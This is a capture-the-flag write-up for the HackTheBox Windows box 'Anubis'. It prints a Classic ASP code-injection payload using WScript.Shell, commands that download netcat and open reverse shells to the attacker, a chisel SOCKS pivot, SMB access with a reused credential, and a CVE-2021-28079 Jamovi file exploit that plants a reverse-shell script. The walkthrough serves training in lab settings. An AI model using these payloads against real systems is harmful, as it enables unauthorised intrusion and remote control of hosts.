## Overview

Anubis is an insane-difficulty Windows box centred on a domain `windcorp.htb`. The public web server runs Classic ASP, and its contact form evaluates user input as server-side code — enough for a foothold, but only inside a locked-down Windows container. From there the path to the user flag runs entirely internal: pivot to the domain controller with chisel, reuse a captured domain credential over SMB, and abuse a Jamovi data file that a scheduled task keeps reopening (CVE-2021-28079) to execute code as `diegocruz`. This post covers recon through `user.txt`.

Realistic chain of ASP code-injection, chisel SOCKS pivot and credential-reuse over SMB scores highest on real-life tradecraft, with a Jamovi CVE-2021-28079 file abuse and custom payload repacking adding moderate CVE/custom weight.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 443  | HTTPS / IIS 10 | Self-signed cert, CN `www.windcorp.htb` |
| 135/139/445 | MSRPC / SMB | Standard Windows |
| (later, internal) | 80, 88, 389, 5985 | DC services reached after pivot |

```bash
nmap -p- --min-rate=1000 -T4 10.129.230.170
nmap -sC -sV -p443 10.129.230.170
```

The certificate's common name reveals the vhost. Browsing by IP gives a 404, so add the name and access by host:

```bash
echo "10.129.230.170 www.windcorp.htb windcorp.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The site is a Classic ASP app. The contact form submits a `GET` to `save.asp`, which stores the message in session and redirects to `preview.asp`, where the message is echoed back:

```bash
curl -sk -c cj.txt -G "https://www.windcorp.htb/save.asp" \
  --data-urlencode "name=a" --data-urlencode "email=a@b.c" \
  --data-urlencode "subject=s" --data-urlencode "message=PRE<%=7*7%>POST"
curl -sk -b cj.txt "https://www.windcorp.htb/preview.asp"   # -> PRE49POST
```

`<%=7*7%>` comes back as `49` — the message field is evaluated as server-side ASP, not rendered as text.

## Foothold

Turn the evaluation into command execution with `WScript.Shell`. The payload below goes in the `message` field; the output of the command is written back into the preview page:

```text
<% Function e(c): Set w = CreateObject("WScript.Shell"): Set r = w.exec(c): e = r.StdOut.ReadAll(): End Function
response.write e("cmd /c whoami") %>
```

This returns `nt authority\system` — but `ipconfig` shows a `172.30.x` address and a different default gateway: we're inside a **Windows container**, not the real host. Stage tooling and a reverse shell through the same injection:

```bash
# attacker: serve binaries + open a listener
python3 -m http.server 8080
nc -lvnp 7777
# payload: w.exec("cmd /c curl http://<lhost>:8080/nc64.exe -o C:\programdata\nc64.exe && C:\programdata\nc64.exe <lhost> 7777 -e cmd")
```

The container can reach the internal domain controller (the gateway), so pivot with a chisel reverse-SOCKS tunnel:

```bash
# attacker
./chisel server -p 9001 --reverse --host 0.0.0.0
# container (via the ASP injection): start /b C:\programdata\chisel.exe client <lhost>:9001 R:socks
```

With `socks5 127.0.0.1 1080` in `proxychains.conf`, the DC's SMB is reachable. A domain credential exposed by an internal "software portal" (`localadmin` / `<redacted>`) lists the shares:

```bash
proxychains4 -q -f proxychains.conf smbclient -L //<dc-ip>/ -U 'localadmin%<redacted>'
proxychains4 -q -f proxychains.conf smbclient //<dc-ip>/Shared -U 'localadmin%<redacted>' -c 'recurse ON; ls'
```

The `Shared\Documents\Analytics` folder holds Jamovi `.omv` files, one of which (`Whatif.omv`) is updated every few minutes — a scheduled task keeps opening it. Jamovi ≤ 1.6.18 (CVE-2021-28079) renders column names unsanitised in its Electron front-end, so a `<script>` in the column metadata runs as the user who opens the file. Inject a reverse shell, repack, and overwrite:

```bash
unzip Whatif.omv -d omv
python3 -c "import json;d=json.load(open('omv/metadata.json'));d['dataSet']['fields'][0]['name']='Col <script>require(\"child_process\").exec(\"C:\\\\programdata\\\\nc64.exe <lhost> 7778 -e cmd\")</script>';json.dump(d,open('omv/metadata.json','w'))"
( cd omv && zip -r ../evil.omv . )
proxychains4 -q -f proxychains.conf smbclient //<dc-ip>/Shared -U 'localadmin%<redacted>' \
  -c 'cd Documents\Analytics; put evil.omv Whatif.omv'
nc -lvnp 7778   # wait for the scheduled task to open the file
```

A few minutes later the listener catches a shell as `windcorp\diegocruz` on the domain controller `earth`.
